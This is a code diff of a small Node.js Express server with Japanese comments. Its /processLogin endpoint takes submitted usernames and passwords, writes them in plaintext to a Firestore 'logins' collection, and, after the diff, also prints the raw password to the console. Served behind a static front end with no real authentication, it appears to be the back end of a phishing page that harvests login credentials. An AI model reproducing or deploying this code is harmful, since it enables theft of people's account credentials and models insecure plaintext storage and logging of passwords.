@@ -1,17 +1,17 @@
 // app.js
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
-const admin = require('firebase-admin');  // firebase-admin を読み込む
+const admin = require('firebase-admin');
 
-// Firebaseの秘密鍵（firebase-service-account.json）を読み込む
-const serviceAccount = require('./firebase-service-account.json');
+// Firebaseの秘密鍵ファイルを読み込む（プロジェクトのルートに配置）
+const serviceAccount = require('./inst-732a8-firebase-adminsdk-fbsvc-8891993b0a.json');
 
+// Firebase Admin SDKの初期化
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount)
 });
 
-// Firestoreのインスタンスを作成
+// Firestoreインスタンスの生成
 const db = admin.firestore();
 
 const app = express();
@@ -26,17 +26,25 @@ app.use(express.static('public'));
 // フォーム送信のエンドポイント
 app.post('/processLogin', async (req, res) => {
   const { username, password } = req.body;
+  
+  // デバッグ用ログ
+  console.log("Received data:", username, password);
+  
   if (!username || !password) {
+    console.error("入力不足: username or password is missing");
     return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
   }
   
   try {
-    // Firestore の "logins" コレクションにデータを追加する
+    // Firestoreの "logins" コレクションにデータを追加する
     const docRef = await db.collection('logins').add({
       username: username,
       password: password,
       date: admin.firestore.FieldValue.serverTimestamp()
     });
+    
+    // デバッグ用ログ：追加したドキュメントIDを出力
+    console.log("Document written with ID:", docRef.id);
     
     res.json({ status: 'Success', id: docRef.id });
   } catch (err) {
@@ -45,8 +53,8 @@ app.post('/processLogin', async (req, res) => {
   }
 });
 
-// サーバー起動
-const PORT = process.env.PORT || 3000;
+// サーバーの起動
+const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
